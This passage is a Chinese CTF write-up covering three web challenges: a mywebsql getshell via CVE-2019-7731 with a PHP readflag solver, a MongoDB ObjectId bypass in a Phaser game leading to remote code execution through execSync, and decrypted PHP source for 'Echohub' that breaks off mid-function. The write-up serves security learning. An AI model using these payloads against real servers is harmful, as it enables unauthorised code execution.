<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="5ce7a8251e9e427f8f6136851f377d03">Web</h2>
<h3 data-content="1" id="af408085614dc4c266e62f885ebe83a1">mywebsql</h3>
<p>直接用admin / admin进后台，使用以下方式来GetShell。<br/>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-7731" target="_blank">https://nvd.nist.gov/vuln/detail/CVE-2019-7731</a></p>
<p>之后阻碍就是<code>readflag</code>，脚本处理。还是第一次看见<code>readflag</code>成为最大阻碍的CTF题……</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">runCommand</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$descriptors</span> <span class="o">=</span> <span class="p">[</span>
        <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"rw"</span><span class="p">),</span>
        <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">),</span>
        <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">),</span>
    <span class="p">];</span>
    <span class="nv">$pipes</span> <span class="o">=</span> <span class="p">[];</span>
    <span class="nv">$process</span> <span class="o">=</span> <span class="nx">\proc_open</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$descriptors</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">,</span> <span class="no">__DIR__</span><span class="p">);</span>
    <span class="nv">$stderr</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
    <span class="nv">$stdout</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">\is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
        <span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="k">FALSE</span><span class="p">);</span>
        <span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="k">FALSE</span><span class="p">);</span>
        <span class="k">while</span> <span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
                <span class="nv">$a</span> <span class="o">=</span> <span class="nb">fgetc</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$stdout</span> <span class="o">.=</span> <span class="nv">$a</span><span class="p">;</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/input your answer:/"</span><span class="p">,</span> <span class="nv">$stdout</span><span class="p">))</span> <span class="p">{</span>
                        <span class="nv">$stdout</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"first"</span><span class="p">,</span> <span class="nv">$stdout</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
                        <span class="nv">$stdout</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"input"</span><span class="p">,</span> <span class="nv">$stdout</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
                        <span class="nv">$ret</span> <span class="o">=</span> <span class="k">eval</span><span class="p">(</span><span class="s1">'return '</span> <span class="o">.</span> <span class="nv">$stdout</span> <span class="o">.</span> <span class="s1">';'</span><span class="p">);</span>
                        <span class="k">echo</span> <span class="nv">$ret</span><span class="p">;</span>
                        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$ret</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">);</span>
                        <span class="nb">fflush</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
                        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nx">\fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="nx">\fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
        <span class="nv">$status</span> <span class="o">=</span> <span class="nx">\proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="p">[</span><span class="nv">$stdout</span><span class="p">,</span> <span class="nv">$stderr</span><span class="p">,</span> <span class="nv">$status</span><span class="p">];</span>
<span class="p">}</span>

<span class="nb">var_dump</span><span class="p">(</span><span class="nx">runCommand</span><span class="p">(</span><span class="s1">'/readflag'</span><span class="p">));</span>
</pre></div>
<h3 data-content="1" id="04e6b59529d5bedf18897f7e24141056">996game</h3>
<p>根据提示，得到游戏源码 <a href="https://github.com/Jerenaux/phaserquest" target="_blank">https://github.com/Jerenaux/phaserquest</a> 。发现其<code>js/client</code>直接暴露在公网，猜测<code>js/server</code>也同样可静态访问。之后直接down整站源码进行对比。</p>
<p>（右侧的代码因为我已经修改过，因此和原始代码不一样，懒得找原始的了）</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190429184400-b2d297ae-6a6b-1.png"/></p>
<p>那我们现在的目的就是让MongoDB报错，执行<code>err.message</code>里的代码了。（虽然感觉好无聊）</p>
<p>观察代码：</p>
<div class="highlight"><pre><span></span><span class="nx">GameServer</span><span class="p">.</span><span class="nx">loadPlayer</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">socket</span><span class="p">,</span><span class="nx">id</span><span class="p">){</span>
  <span class="nx">GameServer</span><span class="p">.</span><span class="nx">server</span><span class="p">.</span><span class="nx">db</span><span class="p">.</span><span class="nx">collection</span><span class="p">(</span><span class="s1">'players'</span><span class="p">).</span><span class="nx">findOne</span><span class="p">({</span><span class="nx">_id</span><span class="o">:</span> <span class="k">new</span> <span class="nx">ObjectId</span><span class="p">(</span><span class="nx">id</span><span class="p">)},</span><span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span><span class="nx">doc</span><span class="p">){</span>
</pre></div>
<p>通过<code>loadPlayer</code>可触发，唯一可控的点只有id。在前端，<code>loadPlayer</code>是点击“Play”时提交到服务器的，参数来源是<code>localStorage</code>。直接随便改改<code>localStorage.playerID</code>，就可以触发服务器报错。只是触发点不在回调里，而在<code>new ObjectId</code>里。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190429184412-b9f60f66-6a6b-1.png"/></p>
<p>反正现在也不知道干啥，先绕过这个<code>ObjectID</code>的验证吧，看看能不能传string以外的东西，绕了以后再研究怎么让MongoDB报错。</p>
<p>先想办法发送任意数据。在控制台输入以下代码后“Start Game”即可解决。</p>
<div class="highlight"><pre><span></span><span class="nx">Client</span><span class="p">.</span><span class="nx">getPlayerID</span> <span class="o">=</span>  <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">(</span><span class="s1">'0123456789ab'</span><span class="p">)</span>
<span class="sb">`</span>
</pre></div>
<p>阅读代码：<a href="https://github.com/mongodb/js-bson/blob/V1.0.0/lib/bson/objectid.js#L30" target="_blank">https://github.com/mongodb/js-bson/blob/V1.0.0/lib/bson/objectid.js#L30</a> 要绕过的第一个点在<code>var valid = ObjectID.isValid(id);</code>。往下拉，可发现</p>
<div class="highlight"><pre><span></span><span class="k">if</span><span class="p">(</span><span class="nx">id</span><span class="p">.</span><span class="nx">toHexString</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">id</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">12</span> <span class="o">||</span> <span class="p">(</span><span class="nx">id</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">24</span> <span class="o">&amp;&amp;</span> <span class="nx">checkForHexRegExp</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">id</span><span class="p">.</span><span class="nx">id</span><span class="p">));</span>
  <span class="p">}</span>
</pre></div>
<p>因此构造payload:</p>
<div class="highlight"><pre><span></span><span class="nx">Client</span><span class="p">.</span><span class="nx">getPlayerID</span> <span class="o">=</span>  <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">({</span> <span class="nx">toHexString</span><span class="o">:</span> <span class="s1">'aaa'</span><span class="p">,</span> <span class="nx">id</span><span class="o">:</span> <span class="p">{</span><span class="nx">length</span><span class="o">:</span> <span class="mi">12</span><span class="p">}</span> <span class="p">})</span>
</pre></div>
<p>之后会发现在序列化时出错：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190429184433-c662e49a-6a6b-1.png"/></p>
<p>具体代码：</p>
<div class="highlight"><pre><span></span><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">hexString</span> <span class="o">+=</span> <span class="nx">hexTable</span><span class="p">[</span><span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">)];</span>
<span class="p">}</span>
</pre></div>
<p>构造Payload：</p>
<div class="highlight"><pre><span></span><span class="nx">Client</span><span class="p">.</span><span class="nx">getPlayerID</span> <span class="o">=</span>  <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">({</span> <span class="nx">toHexString</span><span class="o">:</span> <span class="s1">'aaa'</span><span class="p">,</span> <span class="nx">length</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">id</span><span class="o">:</span> <span class="p">{</span><span class="nx">length</span><span class="o">:</span> <span class="mi">12</span><span class="p">}</span> <span class="p">})</span>
</pre></div>
<p>这样就可以传任意Object了，但是对如何报错还是没有头绪。根据主办方给的提示</p>
<div class="highlight"><pre><span></span><span class="nx">db</span><span class="p">.</span><span class="nx">a</span><span class="p">.</span><span class="nx">find</span><span class="p">({</span><span class="s2">"b"</span><span class="o">:</span><span class="p">{</span><span class="s2">"$gt"</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span><span class="s2">"c"</span><span class="o">:</span><span class="s2">"d"</span><span class="p">}})</span>
</pre></div>
<p>得知，MongoDB解析Token时，内置的操作符必须放在最前面；在内置操作符之后的任何Key都无法被识别导致报错。由此构造Payload：</p>
<div class="highlight"><pre><span></span><span class="nx">Client</span><span class="p">.</span><span class="nx">getPlayerID</span> <span class="o">=</span>  <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">({</span> <span class="s2">"$gt"</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span><span class="s2">"socket.emit(require('child_process').execSync('ls'))"</span><span class="o">:</span><span class="s2">"bb"</span><span class="p">,</span> <span class="nx">toHexString</span><span class="o">:</span> <span class="s1">'aaa'</span><span class="p">,</span> <span class="nx">length</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">id</span><span class="o">:</span> <span class="p">{</span><span class="nx">length</span><span class="o">:</span> <span class="mi">12</span><span class="p">}})</span>
</pre></div>
<p>发现这样就可以ls了。下一步是绕<code>readflag</code>……Nodejs的流处理这种事情有点麻烦，用Perl来搞合适些。直接抄了个脚本：<a href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md" target="_blank">https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md</a></p>
<p>最终Payload：</p>
<div class="highlight"><pre><span></span><span class="nx">Client</span><span class="p">.</span><span class="nx">getPlayerID</span> <span class="o">=</span>  <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">({</span> <span class="s2">"$gt"</span><span class="o">:</span><span class="mi">1</span><span class="p">,[</span><span class="sb">`process.chdir('/');socket.emit('aaa');socket.emit(require('child_process').execSync('perl -e \\'use warnings;use strict;use IPC'+String.fromCharCode(58)+String.fromCharCode(58)+'Open2;$| = 1;chdir("/");my $pid = open2(</span><span class="err">\</span><span class="sb">*out2, </span><span class="err">\</span><span class="sb">*in2, "./readflag") or die;my $reply = &lt;out2&gt;;print STDOUT $reply; $reply = &lt;out2&gt;;print STDOUT $reply; my $answer = eval($reply);print in2 " $answer "; in2-&gt;flush();$reply = &lt;out2&gt;;print STDOUT $reply;print STDOUT $reply;print STDOUT $reply;print STDOUT $reply;\\'').toString('utf-8'))`</span><span class="p">]</span><span class="o">:</span><span class="s2">"bb"</span><span class="p">,</span> <span class="nx">toHexString</span><span class="o">:</span> <span class="s1">'aaa'</span><span class="p">,</span> <span class="nx">length</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">id</span><span class="o">:</span> <span class="p">{</span><span class="nx">length</span><span class="o">:</span> <span class="mi">12</span><span class="p">}})</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190429184442-cbaf721a-6a6b-1.png"/></p>
<h3 data-content="1" id="eb547403e607624a55ece300a99186ed">Echohub</h3>
<p>首先先进行PHP解密，解密后的代码：</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span> <span class="o">^</span> <span class="nx">E_NOTICE</span><span class="p">);</span>
<span class="k">require_once</span> <span class="s1">'sandbox.php'</span><span class="p">;</span>
<span class="nv">$seed</span> <span class="o">=</span> <span class="nb">time</span><span class="p">();</span>
<span class="nb">srand</span><span class="p">(</span><span class="nv">$seed</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'INS_OFFSET'</span><span class="p">,</span> <span class="nb">rand</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">));</span>
<span class="nv">$regs</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'eax'</span> <span class="o">=&gt;</span> <span class="mh">0x0</span><span class="p">,</span> <span class="s1">'ebp'</span> <span class="o">=&gt;</span> <span class="mh">0x0</span><span class="p">,</span> <span class="s1">'esp'</span> <span class="o">=&gt;</span> <span class="mh">0x0</span><span class="p">,</span> <span class="s1">'eip'</span> <span class="o">=&gt;</span> <span class="mh">0x0</span><span class="p">);</span>
<span class="k">function</span> <span class="nf">aslr</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$O0O</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$a</span> <span class="o">+</span> <span class="mh">0x60000000</span> <span class="o">+</span> <span class="nx">INS_OFFSET</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$func_</span> <span class="o">=</span> <span class="nb">array_flip</span><span class="p">(</span><span class="nv">$func</span><span class="p">);</span>
<span class="nb">array_walk</span><span class="p">(</span><span class="nv">$func_</span><span class="p">,</span> <span class="s1">'aslr'</span><span class="p">);</span>
<span class="nv">$plt</span> <span class="o">=</span> <span class="nb">array_flip</span><span class="p">(</span><span class="nv">$func_</span><span class="p">);</span>


<span class="k">function</span> <span class="nf">handle_data</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$len</span> <span class="o">/</span> <span class="mh">0x4</span> <span class="o">+</span> <span class="mh">0x1</span> <span class="o">*</span> <span class="p">(</span><span class="nv">$len</span> <span class="o">%</span> <span class="mh">0x4</span><span class="p">);</span>
    <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">str_split</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">);</span>
    <span class="nv">$ret</span><span class="p">[</span><span class="nv">$a</span> <span class="o">-</span> <span class="mh">0x1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_pad</span><span class="p">(</span><span class="nv">$ret</span><span class="p">[</span><span class="nv">$a</span> <span class="o">-</span> <span class="mh">0x1</span><span class="p">],</span> <span class="mh">0x4</span><span class="p">,</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">);</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$ret</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="o">&amp;</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
         <span class="nv">$value</span> <span class="o">=</span> <span class="nb">strrev</span><span class="p">(</span><span class="nb">bin2hex</span><span class="p">(</span><span class="nv">$value</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">gen_canary</span><span class="p">()</span>
<span class="p">{</span>
    <span class="nv">$canary</span> <span class="o">=</span> <span class="s1">'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQEST123456789'</span><span class="p">;</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$canary</span><span class="p">[</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$canary</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1</span><span class="p">)];</span>
    <span class="nv">$b</span> <span class="o">=</span> <span class="nv">$canary</span><span class="p">[</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$canary</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1</span><span class="p">)];</span>
    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$canary</span><span class="p">[</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$canary</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1</span><span class="p">)];</span>
    <span class="nv">$d</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">handle_data</span><span class="p">(</span><span class="nv">$a</span> <span class="o">.</span> <span class="nv">$b</span> <span class="o">.</span> <span class="nv">$c</span> <span class="o">.</span> <span class="nv">$d</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="nv">$canary</span> <span class="o">=</span> <span class="nx">gen_canary</span><span class="p">();</span>
<span class="nv">$canarycheck</span> <span class="o">=</span> <span class="nv">$canary</span><span class="p">;</span>
<span class="k">function</span> <span class="nf">check_canary</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">global</span> <span class="nv">$canary</span><span class="p">;</span>
    <span class="k">global</span> <span class="nv">$canarycheck</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$canary</span> <span class="o">!=</span> <span class="nv">$canarycheck</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">'emmmmmm...Don\'t attack me!'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">stack</span>
<span class="p">{</span>
    <span class="k">private</span> <span class="nv">$ebp</span><span class="p">,</span> <span class="nv">$stack</span><span class="p">,</span> <span class="nv">$esp</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">stack</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="k">global</span> <span class="nv">$regs</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ebp</span> <span class="o">=&amp;</span> <span class="nv">$regs</span><span class="p">[</span><span class="s1">'ebp'</span><span class="p">];</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">esp</span> <span class="o">=&amp;</span> <span class="nv">$regs</span><span class="p">[</span><span class="s1">'esp'</span><span class="p">];</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ebp</span> <span class="o">=</span> <span class="mh">0xfffe0000</span> <span class="o">+</span> <span class="nb">rand</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">);</span>
        <span class="k">global</span> <span class="nv">$canary</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">stack</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ebp</span> <span class="o">-</span> <span class="mh">0x4</span><span class="p">]</span> <span class="o">=&amp;</span> <span class="nv">$canary</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">stack</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ebp</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ebp</span> <span class="o">+</span> <span class="nb">rand</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xffff</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">esp</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ebp</span> <span class="o">-</span> <span class="nb">rand</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x4</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">stack</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ebp</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">dechex</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$b</span> <span class="o">!=</span> <span class="k">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pushdata</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">pushdata</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nx">handle_data</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">stack</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">esp</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mh">0x4</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
            <span class="c1">//no args in my stack haha</span>
            <span class="nx">check_canary</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">recover_data</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nb">hex2bin</span><span class="p">(</span><span class="nb">strrev</span><span class="p">(</span><span class="nv">$data</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">outputdata</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$regs</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s1">'root says: '</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">esp</span> <span class="o">==</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ebp</span> <span class="o">-</span> <span class="mh">0x4</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pop</span><span class="p">(</span><span class="s1">'eax'</span><span class="p">);</span>
            <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">recover_data</span><span class="p">(</span><span class="nv">$regs</span><span class="p">[</span><span class="s1">'eax'</span><span class="p">]);</span>
            <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
            <span class="k">echo</span> <span class="nv">$ret</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$ret</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x1</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">ret</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">esp</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ebp</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pop</span><span class="p">(</span><span class="s1">'ebp'</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pop</span><span class="p">(</span><span class="s1">'eip'</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">call</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">get_data_from_reg</span><span class="p">(</span><span class="nv">$item</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$regs</span><span class="p">;</span>
        <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">recover_data</span><span class="p">(</span><span class="nv">$regs</span><span class="p">[</span><span class="nv">$item</span><span class="p">]);</span>
        <span class="nv">$b</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$a</span><span class="p">);</span>
        <span class="k">return</span> <span class="nv">$b</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">call</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$regs</span><span class="p">;</span>
        <span class="k">global</span> <span class="nv">$plt</span><span class="p">;</span>
        <span class="nv">$a</span> <span class="o">=</span> <span class="nb">hexdec</span><span class="p">(</span><span class="nv">$regs</span><span class="p">[</span><span class="s1">'eip'</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$a</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pop</span><span class="p">(</span><span class="s1">'eax'</span><span class="p">);</span>
            <span class="nv">$len</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_data_from_reg</span><span class="p">(</span><span class="s1">'eax'</span><span class="p">);</span>
            <span class="nv">$args</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
